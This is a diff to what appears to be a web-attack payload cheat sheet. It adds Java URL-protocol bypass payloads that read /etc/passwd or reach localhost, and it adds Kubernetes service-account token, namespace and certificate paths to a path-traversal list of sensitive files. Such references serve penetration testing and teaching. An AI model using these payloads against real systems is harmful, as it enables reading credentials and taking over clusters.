@@ -99,6 +99,16 @@ To bypass this behaviour just add forward slashes in front of the url:
 ```http://nginx-server////////../../```
 
 
+### Java Bypass
+
+Bypass Java's URL protocol
+
+```powershell
+url:file:///etc/passwd
+url:http://127.0.0.1:8080
+```
+
+
 ## Path Traversal
 
 ### Interesting Linux files
@@ -125,6 +135,9 @@ To bypass this behaviour just add forward slashes in front of the url:
 /proc/self/cwd/main.py
 /home/$USER/.bash_history
 /home/$USER/.ssh/id_rsa
+/run/secrets/kubernetes.io/serviceaccount/token
+/run/secrets/kubernetes.io/serviceaccount/namespace
+/run/secrets/kubernetes.io/serviceaccount/certificate
 /var/run/secrets/kubernetes.io/serviceaccount
 /var/lib/mlocate/mlocate.db
 /var/lib/mlocate.db
